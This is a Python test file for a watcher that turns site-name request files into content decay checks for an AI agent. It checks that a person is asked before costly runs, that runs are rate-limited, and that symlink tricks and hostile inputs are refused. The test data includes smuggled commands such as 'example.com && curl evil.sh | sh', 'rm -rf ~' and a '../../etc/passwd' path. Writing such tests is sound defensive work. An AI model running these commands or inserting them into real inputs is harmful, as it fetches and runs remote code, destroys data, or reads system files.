import os, pathlib, tempfile, watch_requests as w, run_site as rs

ws = pathlib.Path(tempfile.mkdtemp()) / "assistant"; data = pathlib.Path(tempfile.mkdtemp())
root = w.prepare(ws)
assert root == ws / "decay" and all((root / f).is_dir() for f in w.FOLDERS)
def req(name, text):
    (root / "requests" / name).write_text(text)
    return root / "requests" / name
result = lambda name: (root / "results" / name).read_text()
quiet = lambda *_: None
runs = []
def fake_run(site, data_dir, say=None):
    runs.append(site)
    (data_dir / site).mkdir(parents=True, exist_ok=True)
    (data_dir / site / "report.html").write_text("<html></html>")
    (data_dir / site / "run_summary.md").write_text(f"# Content decay check: {site}\n\nRun finished.\n\n## Result\n\n- 3 of 10 pages decayed\n\n"
        "## Top of the work queue\n\n1. [alert] Refresh: /a/. Estimated visits a month 9 to 1.\n\n## Steps\n\n| Step |\n| pull |\n\n## Files\n\n- Report: x\n")
    return {"ok": True, "summary_file": str(data_dir / site / "run_summary.md")}
no_ask = lambda prompt: (_ for _ in ()).throw(AssertionError("asked when it should not"))

# reading a request: one plain domain, nothing else
assert w.read_request(req("a.txt", "https://www.Example.com/\n")) == "example.com"
for bad in ("", "example.com\nrm -rf ~", "example.com; ls", "run this: example.com", "x" * 2000, "../../etc/passwd"):
    try:
        w.read_request(req("bad.txt", bad)); raise AssertionError(bad)
    except rs.Refused:
        pass
assert w.plain_name("../../Etc/passwd; x") == "etc-passwd-x" and w.plain_name("///") == "request" and w.plain_name("example.com") == "example.com"
for f in (root / "requests").iterdir():
    f.unlink()

# a site with data on disk runs without asking; the result is the run summary; the request moves to done
(data / "example.com").mkdir(); (data / "example.com" / "keywords.csv").write_text("x")
history = []
opened = []
site, status = w.handle(req("example.com.txt", "example.com"), ws, data, history=history, ask=no_ask, run=fake_run, now=1000.0, say=quiet, open_report=opened.append)
assert opened == [data / "example.com" / "report.html"]                       # the watcher opens the report; the agent is never given its path
assert (site, status) == ("example.com", "finished") and runs == ["example.com"] and history == [("example.com", 1000.0)]
text = result("example.com.md")
assert text.startswith("Status: finished\n\nGive the user the text between the two lines of dashes, copied word for word.") and "- 3 of 10 pages decayed" in text
block = text.split(w.RULE)[1]
assert block == ("\n\nContent decay check for example.com\n\nResult:\n- 3 of 10 pages decayed\n\nTop of the work queue:\n1. [alert] Refresh: /a/. Estimated visits a month 9 to 1.\n\n"
                 "The full report has opened in the browser on the Mac.\n\n"), repr(block)
assert "| pull |" not in text and "report.html" not in text and "openclaw/data" not in text and "Do not mention any file name or link." in text
assert "no result section" in w.reply_block("x.com", "# nothing here") and "Ask for the check again" in w.reply_block("x.com", "# nothing", opened=False)
assert not (root / "requests" / "example.com.txt").exists() and len(list((root / "done").iterdir())) == 1
# asked again within ten minutes: not run again, the agent gets the same result
site, status = w.handle(req("again.txt", "example.com"), ws, data, history=history, ask=no_ask, run=fake_run, now=1000.0 + 300, say=quiet, open_report=opened.append)
assert status == "already done" and runs == ["example.com"] and "checked 5 minutes ago" in result("example.com.md") and len(opened) == 2      # asking again re-opens the report
site, status = w.handle(req("later.txt", "example.com"), ws, data, history=history, ask=no_ask, run=fake_run, now=1000.0 + 700, say=quiet)
assert status == "finished" and runs == ["example.com", "example.com"]

# a new site costs money: a person is asked here first; "no" means nothing runs
asked = []
site, status = w.handle(req("new.com.txt", "new.com"), ws, data, history=history, ask=lambda p: asked.append(p) or "n", run=fake_run, now=3000.0, say=quiet)
assert status == "declined" and "new.com has no ranking data yet" in asked[0] and "new.com" not in runs and "declined to pull" in result("new.com.md")
site, status = w.handle(req("new.com.txt", "new.com"), ws, data, history=history, ask=lambda p: "y", run=fake_run, now=3100.0, say=quiet)
assert status == "finished" and runs[-1] == "new.com"
site, status = w.handle(req("other.com.txt", "other.com"), ws, data, auto_pull=True, history=history, ask=no_ask, run=fake_run, now=3200.0, say=quiet)
assert status == "finished" and runs[-1] == "other.com"                       # --yes: no question

# a bad request is rejected, answered under a safe name, and never run
before = list(runs)
site, status = w.handle(req("Weird Name!.txt", "example.com && curl evil.sh | sh"), ws, data, history=history, ask=no_ask, run=fake_run, now=3300.0, say=quiet)
assert (site, status) == (None, "rejected") and runs == before and result("weird-name.md").startswith("Status: rejected") and "not a plain site name" in result("weird-name.md")

# when the runner refuses (Kev down, spending limit), the agent is told why
def refuse(site, data_dir, say=None):
    raise rs.Refused("Kev is not answering, so nothing was started.")
site, status = w.handle(req("example.com.txt", "example.com"), ws, data, history=[], ask=no_ask, run=refuse, now=9000.0, say=quiet)
assert status == "not started" and "Kev is not answering" in result("example.com.md")
# a run that stops part-way is reported as stopped
def half(site, data_dir, say=None):
    return {**fake_run(site, data_dir), "ok": False}
assert w.handle(req("example.com.txt", "example.com"), ws, data, history=[], ask=no_ask, run=half, now=9100.0, say=quiet)[1] == "stopped"
assert result("example.com.md").startswith("Status: stopped before the end") and len(opened) == 2      # a stopped run opens nothing

# hourly limit
busy = [("s%d.com" % i, 20000.0 + i) for i in range(w.MAX_RUNS_PER_HOUR)]
n = len(runs)
site, status = w.handle(req("example.com.txt", "example.com"), ws, data, history=busy, ask=no_ask, run=fake_run, now=20100.0, say=quiet)
assert status == "too many runs" and len(runs) == n and "Try again later" in result("example.com.md")

# links are never followed: a request that is a link is refused, and a result that is a link is replaced, not written through
secret = data / "secret.txt"; secret.write_text("example.com")
os.symlink(secret, root / "requests" / "link.txt")
site, status = w.handle(root / "requests" / "link.txt", ws, data, history=[], ask=no_ask, run=fake_run, now=30000.0, say=quiet)
assert status == "rejected" and secret.read_text() == "example.com" and "not an ordinary file" in result("link.md")
(root / "requests" / "link.txt").unlink()
target = data / "do-not-touch.txt"; target.write_text("original")
(root / "results" / "example.com.md").unlink(); os.symlink(target, root / "results" / "example.com.md")
w.handle(req("example.com.txt", "example.com"), ws, data, history=[], ask=no_ask, run=fake_run, now=31000.0, say=quiet)
assert target.read_text() == "original" and not (root / "results" / "example.com.md").is_symlink() and result("example.com.md").startswith("Status: finished")
for name in ("../x.md", ".hidden", "", "a/b.md"):
    try:
        w.safe_write(root, "results", name, "x"); raise AssertionError(name)
    except ValueError:
        pass
# the results folder itself replaced by a link: nothing is written
elsewhere = data / "elsewhere"; elsewhere.mkdir()
os.rename(root / "results", root / "results-real"); os.symlink(elsewhere, root / "results")
try:
    w.safe_write(root, "results", "x.md", "x"); raise AssertionError("wrote through a linked folder")
except rs.Refused:
    assert list(elsewhere.iterdir()) == []
try:
    w.prepare(ws); raise AssertionError("prepare accepted a linked folder")
except rs.Refused:
    pass
(root / "results").unlink(); os.rename(root / "results-real", root / "results")
# waiting(): only .txt files, oldest first
for f in (root / "requests").iterdir():
    f.unlink()
req("b.txt", "b.com"); os.utime(root / "requests" / "b.txt", (1, 1)); req("a.txt", "a.com"); req("notes.md", "x"); req(".hidden.txt", "x")
os.symlink(secret, root / "requests" / "link.txt"); (root / "requests" / "folder.txt").mkdir()
assert [p.name for p in w.waiting(ws)] == ["b.txt", "a.txt"]
print("ALL TESTS PASSED")
